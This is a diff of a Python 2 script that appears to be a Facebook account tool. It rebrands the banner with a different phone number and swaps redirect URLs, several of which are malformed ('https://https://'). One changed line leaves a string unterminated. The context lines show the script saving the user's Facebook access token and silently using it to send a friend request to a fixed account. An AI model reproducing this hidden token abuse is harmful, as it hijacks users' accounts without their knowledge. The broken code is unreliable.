@@ -122,7 +122,7 @@ logo = """
 \033[1;97m•-----------------\033[1;37mJustin.imran\033[1;97m-----------------•
 
 \033[1;41m\033[1;37m[⚡⚡\033[1;37mAuthor Name: JUSTIN_IMRAN     ⚡⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡⚡\033[1;37mPhone Numbr: +923047753788 ⚡⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡⚡\033[1;37mPhone Numbr: +8801779319676 ⚡⚡\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡⚡\033[1;37mFacebook:JusTin Imran 🍆🍆\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡⚡       \033[1;37mFrom: Bangladesh     ⚡⚡\033[1;37m]\033[1;0m
 
@@ -171,10 +171,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCzTbemCE3YgSBR9STEmH8Cg')
+            os.system('xdg-open https://https://www.youtube.com/channel/UCxc9zuAMRrymJc4sR2rb2fg')
     else:
         print "\033[1;97mWrong Username"
-        os.system('xdg-open https://https://www.facebook.com/X.Zack.75
+        os.system('xdg-open https://www.youtube.com/channel/UCxc9zuAMRrymJc4sR2rb2fg
 
 ##### LICENSE #####
 #=================#
@@ -212,7 +212,7 @@ def pilih_login():
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
         elif peak =="4":
-	        os.system('xdg-open https://www.youtube.com/channel/UCzTbemCE3YgSBR9STEmH8Cg')
+	        os.system('xdg-open https://https://www.youtube.com/channel/UCxc9zuAMRrymJc4sR2rb2fg')
 	        login()
         elif peak =="5":
 	        os.system('xdg-open https://www.youtube.com/channel/UCzTbemCE3YgSBR9STEmH8Cg')
@@ -264,7 +264,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\033[1;47m\033[1;91mLogin Successful\033[1;0m'
-				os.system('xdg-open https://https://www.facebook.com/X.Zack.75')
+				os.system('xdg-open https://https://https://www.youtube.com/channel/UCxc9zuAMRrymJc4sR2rb2fg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
